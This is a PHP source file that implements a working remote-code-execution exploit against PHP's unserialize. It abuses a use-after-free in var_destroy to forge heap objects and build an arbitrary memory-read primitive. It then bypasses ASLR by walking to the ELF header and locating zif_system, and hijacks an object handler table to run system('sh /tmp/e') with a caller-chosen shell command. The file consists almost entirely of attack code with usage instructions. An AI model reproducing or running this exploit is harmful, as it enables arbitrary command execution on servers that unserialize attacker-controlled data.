<?php
// pwn_zero4_universal.php — zero4 RCE, unconditional ASLR bypass.
// No gdb. No baked process address. No per-build offset. No /proc. No second
// copy of the binary. The strlen oracle is already the absolute address of
// zend_empty_array. Everything else is read through that oracle.
//
// Same bug and same heap dance as pwn_zero4_live.php (var_destroy re-entry
// UAF, released PHP through 8.5.12, fixed upstream 08f4b64). x86_64 SysV:
// the forged zend_object is also the fake execute_data in rdi.
//
// After FIRE reclaims block2, R:1023 is a forged IS_STRING whose type_flags
// stay 0 (not refcounted). strlen() therefore loads one qword — the
// zend_string.len at probe+16 — and never touches the header. Poking the
// 8-byte pointer at pat[112] turns that into an arbitrary qword read.
// Unmapped loads SIGSEGV and PHP cannot catch them, so every address below
// is either inside a range already proved mapped or one page below a code
// pointer (the text mapping is contiguous with the ELF header on a normal
// PIE; the page under the header is never read).
//
//   1. Read the 56-byte zend_empty_array. Keep 8-aligned qwords in
//      (0x10000, 0x7fffffffffff). Walk DOWN from the lowest one, one page
//      at a time, until the page starts with \x7fELF. Stop on the match.
//      The data VMA has a hole under it; a data pointer is never the lowest
//      on a normal link (ZVAL_PTR_DTOR in .text is).
//   2. Parse PT_LOAD from that header with the same qword read. Bias is
//      header_runtime - (p_vaddr - p_offset) of the LOAD that contains file
//      offset 0. PIE and ET_EXEC share this. Reject the header if it does
//      not cover the oracle (it would be a different image).
//   3. Scan non-exec LOADs for a qword that points at the bytes system\0.
//      The next qword is zif_system when it lands in a PF_X LOAD, num_args
//      is 1..8 and flags are 0. ld-merged "0.system" still matches because
//      the relocated fname pointer addresses the suffix. The lookalike
//      whose next qword is not code does not pass.
//   4. Plant that absolute address at every zend_object_handlers pointer
//      from +8 through +0x180. +0 stays offset 0. var_dump's first call is
//      get_class_name: 8.1 at +128, 8.5 (clone_obj_with) at +136.
//   5. R:1023 must still show \x7fELF at the header or we do not call.
//
// Discovery runs AFTER str_repeat, so nothing in it can steal the 2-page
// hole. pat length stays 2040. str_repeat x4 == 8160. Block2 = leak - 5056.
// Spacing must be 128. FIRE dtor is still walk slot 19.
//
// usage:
//   php -n pwn_zero4_universal.php [attempts] [cmd]
// cmd is the shell body written to /tmp/e (default: id > /tmp/pwned_zero4_universal).
// The forged call is system("sh /tmp/e"). No offset arguments.

$READS = 0;

function note(string $m): void {
    fwrite(STDERR, $m);
    fflush(STDERR);
}

function hexq(int $q): string {
    return bin2hex(strrev(pack('P', $q)));
}

function q_u16(int $q, int $boff): int {
    return unpack('v', substr(pack('P', $q), $boff, 2))[1];
}

function q_u32(int $q, int $boff): int {
    return unpack('V', substr(pack('P', $q), $boff, 4))[1];
}

/** In-place. $s must stay refcount 1 or the forge COWs off the reclaimed page. */
function poke(string &$s, int $off, int $val): void {
    $p = pack('P', $val);
    $s[$off]     = $p[0];
    $s[$off + 1] = $p[1];
    $s[$off + 2] = $p[2];
    $s[$off + 3] = $p[3];
    $s[$off + 4] = $p[4];
    $s[$off + 5] = $p[5];
    $s[$off + 6] = $p[6];
    $s[$off + 7] = $p[7];
}

/**
 * R:1023 rewrites the forged zval's type_info (6 -> refcounted) on the way
 * out. The next call would GC_ADDREF the probe header. A header in the
 * binary is read-only, so that addl SIGSEGVs. Put type 6 / flags 0 back
 * before every read. 120 is fz3's type byte; the pointer poke stops at 119.
 */
function restore_zval_type(string &$s, int $typeOff): void {
    $s[$typeOff]     = "\x06";
    $s[$typeOff + 1] = "\x00";
    $s[$typeOff + 2] = "\x00";
    $s[$typeOff + 3] = "\x00";
    $s[$typeOff + 4] = "\x00";
    $s[$typeOff + 5] = "\x00";
    $s[$typeOff + 6] = "\x00";
    $s[$typeOff + 7] = "\x00";
}

/** strlen(R:1023) == qword at $addr. null means the forge did not return a string. */
function mem_qword(string &$s, int $addr): ?int {
    global $READS;
    $READS++;
    if ($addr < 16) return null;
    poke($s, 112, $addr - 16);
    restore_zval_type($s, 120);
    $z = unserialize('R:1023;');
    if (!is_string($z)) return null;
    return strlen($z);
}

function is_elf_magic(int $q): bool {
    if ($q < 0) return false;
    return substr(pack('P', $q), 0, 7) === "\x7fELF\x02\x01\x01";
}

function is_system_str(int $q): bool {
    if ($q < 0) return false;
    return substr(pack('P', $q), 0, 7) === "system\0";
}

/**
 * Page-walk down from a pointer that is already known to be mapped.
 * Prints each page BEFORE the load so a SIGSEGV names the hole.
 * Does not step past a header match (the page below it is unmapped).
 */
function walk_base(string &$s, int $from): ?int {
    $page = $from & ~4095;
    $steps = 0;
    while ($steps < 16384 && $page >= 0x10000) {
        note("WALK step=$steps page=0x" . dechex($page) . "\n");
        $q = mem_qword($s, $page);
        if ($q === null) {
            note("M2-BAIL qword read failed at 0x" . dechex($page) . "\n");
            return null;
        }
        if (is_elf_magic($q)) {
            note("BASE 0x" . dechex($page) . " steps=$steps\n");
            return $page;
        }
        $page -= 4096;
        $steps++;
    }
    note("M2-BAIL no ELF header within cap. last_page=0x" . dechex($page) .
         " from=0x" . hexq($from) . " steps=$steps\n");
    return null;
}

/** @return ?array{etype:int,segs:array<int,array{off:int,vaddr:int,filesz:int,flags:int}>} */
function parse_loads(string &$s, int $base): ?array {
    $q10 = mem_qword($s, $base + 0x10);
    $q20 = mem_qword($s, $base + 0x20);
    $q30 = mem_qword($s, $base + 0x30);
    $q38 = mem_qword($s, $base + 0x38);
    if ($q10 === null || $q20 === null || $q30 === null || $q38 === null) {
        note("M2-BAIL header qword unreadable\n");
        return null;
    }
    $etype = q_u16($q10, 0);
    $mach = q_u16($q10, 2);
    if ($mach !== 62 || ($etype !== 2 && $etype !== 3)) {
        note("M2-BAIL e_type=$etype e_machine=$mach\n");
        return null;
    }
    if ($q20 < 64 || $q20 > 4096) {
        note("M2-BAIL e_phoff 0x" . hexq($q20) . " outside the header page\n");
        return null;
    }
    $phoff = $q20;
    $phentsize = q_u16($q30, 6);
    $phnum = q_u16($q38, 0);
    note("ELF etype=$etype phoff=0x" . dechex($phoff) .
         " phentsize=$phentsize phnum=$phnum\n");
    if ($phentsize < 56 || $phentsize > 256 || $phnum < 1 || $phnum > 128) {
        note("M2-BAIL bad phdr geometry\n");
        return null;
    }
    if ($phoff + $phnum * $phentsize > 4096) {
        note("M2-BAIL phdrs leave the mapped header page\n");
        return null;
    }
    $segs = [];
    for ($i = 0; $i < $phnum; $i++) {
        $ph = $base + $phoff + $i * $phentsize;
        $z0 = mem_qword($s, $ph);
        $po = mem_qword($s, $ph + 8);
        $va = mem_qword($s, $ph + 16);
        $fsz = mem_qword($s, $ph + 32);
        if ($z0 === null || $po === null || $va === null || $fsz === null) {
            note("M2-BAIL phdr $i unreadable\n");
            return null;
        }
        if (q_u32($z0, 0) !== 1) continue; // PT_LOAD
        if ($po < 0 || $va < 0 || $fsz <= 0) continue;
        $segs[] = [
            'off' => $po,
            'vaddr' => $va,
            'filesz' => $fsz,
            'flags' => q_u32($z0, 4),
        ];
    }
    if (!$segs) {
        note("M2-BAIL no PT_LOAD\n");
        return null;
    }
    return ['etype' => $etype, 'segs' => $segs];
}

/** @param array<int,array{0:int,1:int,2:bool}> $ranges */
function in_range(array $ranges, int $addr, ?bool $exec): bool {
    if ($addr < 0x10000) return false;
    foreach ($ranges as [$lo, $hi, $ex]) {
        if ($exec !== null && $ex !== $exec) continue;
        if ($addr >= $lo && $addr < $hi) return true;
    }
    return false;
}

/** @param array<int,array{0:int,1:int,2:bool}> $ranges */
function fits(array $ranges, int $addr, int $n): bool {
    foreach ($ranges as [$lo, $hi, $_ex]) {
        if ($addr >= $lo && $addr + $n <= $hi) return true;
    }
    return false;
}

/**
 * zend_function_entry at $entry whose fname qword is already known to be
 * the bytes system\0. Returns the absolute handler, or null.
 */
function entry_handler(string &$s, int $entry, array $ranges): ?int {
    $handler = mem_qword($s, $entry + 8);
    if ($handler === null || $handler <= 0x10000) return null;
    if (!in_range($ranges, $handler, true)) return null;
    $arginfo = mem_qword($s, $entry + 16);
    if ($arginfo === null) return null;
    if ($arginfo !== 0 && !in_range($ranges, $arginfo, null)) return null;
    $nf = mem_qword($s, $entry + 24);
    if ($nf === null || $nf < 0) return null;
    $nargs = q_u32($nf, 0);
    $flags = q_u32($nf, 4);
    if ($nargs < 1 || $nargs > 8 || $flags !== 0) {
        note("skip entry=0x" . dechex($entry) .
             " handler=0x" . hexq($handler) .
             " nargs=$nargs flags=0x" . dechex($flags) . "\n");
        return null;
    }
    return $handler;
}

/**
 * Prefer the non-exec LOAD that holds the oracle, scanning down from it
 * first (the function entry sits just below zend_empty_array on stock PHP).
 * Any other non-exec LOAD is scanned after. First entry_handler hit wins.
 *
 * @param array<int,array{0:int,1:int,2:bool}> $ranges
 */
function find_zif(string &$s, int $empty, array $ranges): ?int {
    $prefer = null;
    $rest = [];
    foreach ($ranges as $r) {
        if ($r[2]) continue; // executable — entries are not stored there
        if ($empty >= $r[0] && $empty < $r[1]) $prefer = $r;
        else $rest[] = $r;
    }
    $order = [];
    if ($prefer !== null) $order[] = $prefer;
    foreach ($rest as $r) $order[] = $r;
    if (!$order) {
        note("M2-BAIL no non-exec PT_LOAD\n");
        return null;
    }
    foreach ($order as $ri => [$lo, $hi, $_ex]) {
        $max = $hi - 32;
        if ($max < $lo) continue;
        $start = $empty & ~7;
        if ($ri !== 0 || $start < $lo || $start > $max) $start = $max;
        note("SCAN 0x" . dechex($lo) . "-0x" . dechex($hi) .
             " from=0x" . dechex($start) . "\n");
        for ($a = $start; $a >= $lo; $a -= 8) {
            $hit = consider_entry($s, $a, $ranges);
            if ($hit !== null) return $hit;
            if ((($start - $a) & 0xfff) === 0) {
                note("scan at=0x" . dechex($a) . " reads=" . $GLOBALS['READS'] . "\n");
            }
        }
        for ($a = $start + 8; $a <= $max; $a += 8) {
            $hit = consider_entry($s, $a, $ranges);
            if ($hit !== null) return $hit;
        }
    }
    note("M2-BAIL zif_system not referenced from a non-exec LOAD\n");
    return null;
}

/** @param array<int,array{0:int,1:int,2:bool}> $ranges */
function consider_entry(string &$s, int $entry, array $ranges): ?int {
    $q = mem_qword($s, $entry);
    if ($q === null || $q < 0x10000) return null;
    if (!fits($ranges, $q, 8)) return null;
    $bytes = mem_qword($s, $q);
    if ($bytes === null || !is_system_str($bytes)) return null;
    note("fname entry=0x" . dechex($entry) . " -> 0x" . hexq($q) . "\n");
    return entry_handler($s, $entry, $ranges);
}

/** @return ?array{base:int,bias:int,zif:int,off_empty:int,off_zif:int,etype:int} */
function discover(string &$s, int $empty): ?array {
    global $READS;
    $t0 = microtime(true);
    $q0 = mem_qword($s, $empty);
    $q1 = mem_qword($s, $empty + 8);
    if ($q0 === null || $q1 === null) {
        note("M2-BAIL qword read failed on the oracle object\n");
        return null;
    }
    if ($q0 === $q1) {
        note("M2-BAIL poke did not land (both qwords 0x" . hexq($q0) . ")\n");
        return null;
    }
    $gb = pack('P', $q0);
    $rc = unpack('V', substr($gb, 0, 4))[1];
    $type = ord($gb[4]);
    note("gc=0x" . hexq($q0) . " rc=$rc typebyte=0x" . dechex($type) .
         " q1=0x" . hexq($q1) . "\n");
    if (($type & 0x0f) !== 7 || $rc < 1 || $rc > 8) {
        note("M2-BAIL oracle is not a zend_array header\n");
        return null;
    }

    $cands = [];
    for ($off = 0; $off < 56; $off += 8) {
        if ($off === 0) $v = $q0;
        elseif ($off === 8) $v = $q1;
        else $v = mem_qword($s, $empty + $off);
        if ($v === null) {
            note("M2-BAIL qword read failed at empty+$off\n");
            return null;
        }
        note("obj+$off 0x" . hexq($v) . "\n");
        if ($v > 0x10000 && $v < 0x7fffffffffff && ($v & 7) === 0) {
            $cands[] = [$off, $v];
        }
    }
    if (!$cands) {
        note("M2-BAIL no aligned pointer inside zend_empty_array\n");
        return null;
    }
    usort($cands, function ($a, $b) { return $a[1] <=> $b[1]; });
    note("WALK lowest obj+" . $cands[0][0] . " 0x" . hexq($cands[0][1]) . "\n");
    $base = walk_base($s, $cands[0][1]);
    if ($base === null) return null;

    $img = parse_loads($s, $base);
    if ($img === null) return null;
    $seg0 = null;
    foreach ($img['segs'] as $seg) {
        if ($seg['off'] === 0) { $seg0 = $seg; break; }
    }
    if ($seg0 === null) {
        note("M2-BAIL no PT_LOAD contains file offset 0\n");
        return null;
    }
    $bias = $base - ($seg0['vaddr'] - $seg0['off']);
    $ranges = [];
    $covered = false;
    foreach ($img['segs'] as $seg) {
        $lo = $bias + $seg['vaddr'];
        $hi = $lo + $seg['filesz'];
        $ex = ($seg['flags'] & 1) !== 0;
        $ranges[] = [$lo, $hi, $ex];
        if ($empty >= $lo && $empty < $hi) $covered = true;
        note(sprintf(
            "LOAD lo=0x%s hi=0x%s %s\n",
            dechex($lo), dechex($hi), $ex ? 'X' : 'R'
        ));
    }
    if (!$covered) {
        note("M2-BAIL header 0x" . dechex($base) .
             " does not cover oracle 0x" . hexq($empty) . "\n");
        return null;
    }
    $zif = find_zif($s, $empty, $ranges);
    if ($zif === null) return null;
    $offE = $empty - $bias;
    $offZ = $zif - $bias;
    $dt = microtime(true) - $t0;
    note("RECEIPT base=0x" . dechex($base) .
         " bias=0x" . dechex($bias) .
         " zif=0x" . dechex($zif) .
         " off_empty=0x" . dechex($offE) .
         " off_zif=0x" . dechex($offZ) .
         " etype=" . $img['etype'] .
         " reads=$READS" .
         " dt=" . sprintf('%.3f', $dt) . "\n");
    return [
        'base' => $base,
        'bias' => $bias,
        'zif' => $zif,
        'off_empty' => $offE,
        'off_zif' => $offZ,
        'etype' => $img['etype'],
    ];
}

$MARKER   = '/tmp/pwned_zero4_universal';
$ATTEMPTS = (int)($argv[1] ?? 5);
$BODY     = (string)($argv[2] ?? "id > $MARKER\n");
if (!str_ends_with($BODY, "\n")) $BODY .= "\n";

@unlink($MARKER);
file_put_contents('/tmp/e', $BODY);

class D { public static string $dp = ''; public static string $fp = ''; }
class E {
    public static int $block2 = 0;
    public static int $empty = 0;
}

class Stage1 {
    public function __destruct() {
        $arr = unserialize(D::$dp);
        $blk = $arr[129];
        if ($blk === 5 || !is_int($blk) || $blk < 0x10000) {
            echo "DANCE-MISS (attempt skipped)\n"; return;
        }
        $block2 = $blk - 5056;
        echo "M1 block2 = 0x", dechex($block2), "\n";

        $u2 = unserialize('a:0:{}');
        $u3 = unserialize('a:0:{}');
        $u4 = unserialize('a:0:{}');
        $u5 = unserialize('a:0:{}');
        $vm5 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 1) { $vm5 = (int)$v; } }
        if ($vm5 < 0x10000) { echo "LEAK-MISS T_u5\n"; return; }

        $u6 = unserialize('a:0:{}');
        $u7 = unserialize('a:0:{}');
        $u8 = unserialize('a:0:{}');
        $u9 = unserialize('a:0:{}');
        $vs = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 2) { $vs = $v; } }

        $u10 = unserialize('a:0:{}');
        $len_s = strlen($vs);                     // *(&T_u9+16) = &zend_empty_array

        $u11 = unserialize('a:0:{}');
        $u12 = unserialize('a:0:{}');
        $u13 = unserialize('a:0:{}');
        $vm13 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 3) { $vm13 = (int)$v; } }

        $u14 = unserialize('a:0:{}');
        $u15 = unserialize('a:0:{}');
        $u16 = unserialize('a:0:{}');
        $u17 = unserialize('a:0:{}');
        $vs2 = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 4) { $vs2 = $v; } }
        $u18 = unserialize('a:0:{}');
        $len_s2 = strlen($vs2);

        echo "M2 T_u5=0x", dechex($vm5), " T_u13=0x", dechex($vm13),
             " spacing=", ($vm13 - $vm5), "\n";
        echo "M2 ORACLE1=0x", dechex($len_s), " ORACLE2=0x", dechex($len_s2), "\n";

        if ($vm13 - $vm5 !== 128) { echo "M2-BAIL slot spacing\n"; return; }
        if ($len_s !== $len_s2)   { echo "M2-BAIL oracle mismatch\n"; return; }
        if ($len_s < 0x10000)     { echo "M2-BAIL oracle pointer\n"; return; }

        // The resolver used to run here and freed 2-page stream buffers
        // before the walk freed block2. Discovery is inside FIRE, after
        // the reclaim, and stores nothing but this absolute pointer.
        E::$block2 = $block2;
        E::$empty  = $len_s;
        echo "M2-DONE empty=0x", dechex($len_s), "\n";

        unset($arr);   // leave rc=1 held by dtor slot[1] => walk frees block2
        unserialize(D::$fp);
    }
}

class FIRE {
    public function __destruct() {
        $block2 = E::$block2;
        $empty = E::$empty;
        if (!$block2 || !$empty) { echo "FIRE-BAIL no statics\n"; return; }

        $V = function ($off) use ($block2) { return $block2 + 24 + $off; };
        $OBJ = $V(128); $HT = $V(600); $CE = $V(1600); $SMINI = $V(224);

        $MAGIC1 = 0x4142434445464748;
        $MAGIC2 = 0x1122334455667788;

        // Layout (pat[x] == block2+24+x == string val[x]; 2040 bytes total):
        //   pat[0..8]   data[1] -> fz1 @32 ; pat[8..16] data[2] -> fz2 @48
        //   pat[16..24] data[3] -> forge zval @64
        //   fz1 {str@80} len@96 = MAGIC1 ; fz2 {str@88} len@104 = MAGIC2
        //   forge {&OBJ, 0x108} @64 ; OBJ @128 ; SMINI @224 ; HT @600 ; CE @1600
        // fz3 starts aimed at the oracle object. Discovery retargets it.
        // Handler slots start zero and get the absolute zif after discovery.
        $pat  = pack('P', $V(32));                   // 0..8   data[1] = P1
        $pat .= pack('P', $V(48));                   // 8..16  data[2] = P2
        $pat .= pack('P', $V(64));                   // 16..24 data[3] = P3 (forge zval)
        $pat .= pack('P', $V(112));                  // 24..32 data[4] = P4 (fz3)
        $pat .= pack('PVV', $V(80), 6, 0);           // 32..48 fz1: string @80
        $pat .= pack('PVV', $V(88), 6, 0);           // 48..64 fz2: string @88
        $pat .= pack('PVV', $OBJ, 0x108, 0);         // 64..80 forge zval {&OBJ, IS_OBJECT|RC}
        $pat .= str_repeat("\x00", 16);              // 80..96 str1 header (gc,h)
        $pat .= pack('P', $MAGIC1);                  // 96..104 str1.len
        $pat .= pack('P', $MAGIC2);                  // 104..112 str2.len (str2 header @88)
        $pat .= pack('PVV', $empty - 16, 6, 0);      // 112..128 fz3: len = *(empty)
        // OBJ @128 (also the fake zend_execute_data, rdi):
        $pat .= pack('VV', 1, 0x208);                // +0  gc rc=1, IS_OBJECT|FREE_CALLED
        $pat .= pack('VV', 0, 0);                    // +8  handle, extra_flags
        $pat .= pack('P', $CE);                      // +16 ce -> zeros
        $pat .= pack('P', $HT);                      // +24 handlers -> table
        $pat .= pack('P', 0);                        // +32 properties
        $pat .= pack('P', 0x0000000100000000);       // +40 num_args=1 @+44
        $pat .= str_repeat("\x00", 32);              // +48..80
        $pat .= pack('PVV', $SMINI, 6, 0);           // +80 arg1 = {str, IS_STRING}
        // SMINI @224 (= OBJ+96):
        $pat .= pack('VV', 1, 0x16);                 // gc rc=1, GC_STRING
        $pat .= pack('P', 0);                        // h
        $pat .= pack('P', 9);                        // len = 9
        $pat .= "sh /tmp/e\x00";                     // val
        $pat .= str_repeat("\x00", 600 - 258);       // pad to HT @600
        // HANDLERS @600. +0 is the int/size_t offset (kept 0).
        // +8 .. +0x180 inclusive are filled with zif_system after discovery.
        // 48 pointers * 8 + 8 = 392. Ends at pat 992, below CE @1600.
        $pat .= str_repeat("\x00", 392);
        $pat .= str_repeat("\x00", 1600 - 992);      // CE zeros
        $pat .= str_repeat("\x00", 2040 - 1600);
        if (strlen($pat) !== 2040) { echo "PAT-LEN ", strlen($pat), "\n"; return; }
        if (ord($pat[120]) !== 6) { echo "TYPE-BYTE\n"; return; }

        $s = str_repeat($pat, 4);                    // 8160B: 2 pages, reclaims block2
        echo "M3-STR patlen=", strlen($pat), " strlen=", strlen($s),
             " first16=", bin2hex(substr($s, 0, 16)), "\n";
        flush();

        $c1z = unserialize('R:1020;');
        echo "M3-R1020-done\n"; flush();
        $c2z = unserialize('R:1021;');
        echo "M3-R1021-done\n"; flush();
        $c1 = strlen($c1z); $c2 = strlen($c2z);
        if ($c1 !== $MAGIC1 || $c2 !== $MAGIC2) {
            echo "RECLAIM-MISS c1=0x", dechex($c1), " c2=0x", dechex($c2), "\n";
            return;
        }
        echo "M3 string reclaim OK (canaries verified at block2)\n";

        $img = discover($s, $empty);
        if ($img === null) return;
        // The last R:1023 leaves fz3's type_info refcounted. mem_qword puts
        // type 6 back before the next load. Do not bail on the dirty byte.

        $zif = $img['zif'];
        for ($slot = 8; $slot <= 0x180; $slot += 8) {
            poke($s, 600 + $slot, $zif);
        }
        // Read the slot back through R:1023, not substr: a COW would make
        // $s look right while the reclaimed page still holds zeros.
        $seen128 = mem_qword($s, $HT + 128);
        $seen136 = mem_qword($s, $HT + 136);
        if ($seen128 !== $zif || $seen136 !== $zif) {
            echo "M3-BAIL handler poke missed the reclaim 128=0x",
                ($seen128 === null ? 'null' : hexq($seen128)),
                " 136=0x", ($seen136 === null ? 'null' : hexq($seen136)), "\n";
            return;
        }

        // Do not re-read R:1020/R:1021. The first strlen rewrites those zvals
        // (type 6 -> 0x10a, pointer retargeted). The len bytes and the
        // not-yet-read object zval stay put; the pre-discovery check stands.

        $c3 = mem_qword($s, $img['base']);
        if ($c3 === null || !is_elf_magic($c3)) {
            echo "M3-BAIL base ELF-magic mismatch: 0x", ($c3 === null ? 'null' : hexq($c3)), "\n";
            return;
        }
        echo "M3 BASE verified via ELF magic at BASE+0\n";
        echo "M3 off_empty=0x", dechex($img['off_empty']),
             " off_zif=0x", dechex($img['off_zif']),
             " etype=", $img['etype'], "\n";
        flush();

        $r1 = unserialize('R:1022;');
        echo "M3 forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
             " zif_system=0x", dechex($zif), "\n";
        echo "TRIGGER var_dump(\$r1) -> zif_system(fake_execute_data)\n";
        flush();
        var_dump($r1);
        echo "SURVIVED-CALL\n";
    }
}

// ---- payloads (same dance / same 1020-walk as the live file) ----
$d  = 'i:129;i:5;';
$d .= 'i:1028;i:1;';
$d .= 'i:8;s:8:"AAAAAAAA";';
$d .= 'i:10;i:1;';
$d .= 'i:12;s:8:"BBBBBBBB";';
for ($m = 5; $m <= 61; $m++) { $d .= 'i:' . (2 * $m + 4) . ';i:1;'; }
for ($j = 2; $j <= 65; $j++) { $d .= 'i:' . (256 * $j) . ';R:1;'; }
$d .= 'i:16896;i:1;';
D::$dp = 'a:127:{' . $d . '}';
D::$fp = 'O:4:"FIRE":0:{}';

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:6:"Stage1":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';

for ($try = 1; $try <= $ATTEMPTS; $try++) {
    echo "=== attempt $try ===\n";
    $r = unserialize($payload);
    echo "outer ok=", var_export($r !== false, true), "\n";
    if (is_file($MARKER)) break;
}
if (is_file($MARKER)) {
    echo "MARKER $MARKER:\n", trim((string)file_get_contents($MARKER)), "\n";
    echo "[PASS] zero4 universal RCE: in-band, no gdb, no /proc, no offset table, ASLR on\n";
} else {
    echo "[FAIL] marker missing\n";
}
echo "SCRIPT-END\n";
